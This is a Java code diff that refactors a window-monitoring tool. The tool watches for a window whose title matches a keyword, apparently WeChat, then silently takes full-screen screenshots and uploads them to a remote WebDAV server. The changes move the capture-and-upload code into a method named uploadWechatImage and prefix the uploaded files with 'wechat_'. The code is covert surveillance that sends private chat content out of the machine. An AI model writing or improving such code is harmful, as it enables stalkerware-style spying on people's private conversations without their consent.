@@ -59,25 +59,27 @@ public class WindowMonitorUploader {
             try {
                 String title = getActiveWindowTitle();
                 if (title.contains(MATCH_KEYWORD)) {
-                    BufferedImage screenshot = takeFullScreenshot();
-                    String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyyMMdd_HHmmss"));
-                    String fileName = "screenshot_" + timestamp + ".png";
-                    // 将截图写入 ByteArrayOutputStream
-                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    ImageIO.write(screenshot, "png", baos);
-                    baos.flush();
-                    byte[] imageData = baos.toByteArray();
-                    baos.close();
-
-                    // 直接使用 byte[] 上传文件
-                    sardine.put(WEBDAV_URL + fileName, imageData);
-                    //System.out.println("已上传截图: " + fileName);
+                    uploadWechatImage(sardine);
                 }
                 Thread.sleep(interval);
             } catch (Exception e) {
                 e.printStackTrace();
             }
         }
+    }
+
+    private static void uploadWechatImage(Sardine sardine) throws Exception {
+        BufferedImage screenshot = takeFullScreenshot();
+        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy_MM_dd_HHmmss"));
+        String fileName = "wechat_" + timestamp + ".png";
+        // 将截图写入 ByteArrayOutputStream
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ImageIO.write(screenshot, "png", baos);
+        baos.flush();
+        byte[] imageData = baos.toByteArray();
+        baos.close();
+        // 直接使用 byte[] 上传文件
+        sardine.put(WEBDAV_URL + fileName, imageData);
     }
 
     private static String getActiveWindowTitle() {
